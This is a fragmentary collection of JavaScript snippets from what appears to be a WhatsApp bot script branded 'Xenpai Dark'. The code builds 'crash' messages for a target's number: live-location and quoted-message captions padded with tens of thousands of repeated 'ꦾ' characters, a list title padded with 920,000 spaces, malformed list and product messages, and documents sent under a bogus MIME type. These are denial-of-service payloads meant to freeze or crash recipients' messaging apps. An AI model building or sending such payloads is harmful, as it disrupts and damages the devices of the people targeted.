...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 `+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🦇𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 ",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/8jytLxS/LWNi-KHQ69801.jpg" } }, { upload: GlobalTechInc.waUploadToServer }))
      },
      body: {
        text: ""
      },
...
async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 "+" ".repeat(920000),
        'footerText': `𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 `,
        'description': `𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 `,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
...
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      ...
      'footerText': "𝕯𝖆𝖗𝖐 𝕸𝖉 ๖ມG꙰ཀ͜͡🦇⃟╮",
      'description': "𝕯𝖆𝖗𝖐 𝕸𝖉 ๖ມG꙰ཀ͜͡🦇⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
    ...
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '𝕯𝖆𝖗𝖐 𝕸𝖉🦇⃟.' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
  ...
  GlobalTechInc.relayMessage(jid, {
    'extendedTextMessage': {
      ...
      'contextInfo': {
        ...
        'participant': jid,
        'quotedMessage': {
          'conversation': '𝕯𝖆𝖗𝖐 𝕸𝖉🦇⃟.' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
                    ...
                    GlobalTechInc.sendMessage(i, {
                        ...
                        contextInfo: {
                            externalAdReply: {
                                ...
                                thumbnailUrl: 'https://i.ibb.co/8jytLxS/LWNi-KHQ69801.jpg',
                ...
                GlobalTechInc.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} text owner: wa.me/2349137178897`,
                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
...
await GlobalTechInc.sendMessage(jid, {
    'document': XeonDoc,
    'fileName': "𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 " + xeontext1,
    'mimetype': "application/zip",
    'caption': "𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 " + xeontext1,
...
title: `𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐's your papa`
  ...
  GlobalTechInc.sendMessage(
    chat,
    {
      document: { url: "./settings.js" },
      mimetype: `image/null`,
      fileName: `𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐 ${xeontext11}`,
      caption: `𝖃𝖊𝖓𝖕𝖆𝖎 𝕯𝖆𝖗𝖐  ${xeontext11}`,
    },
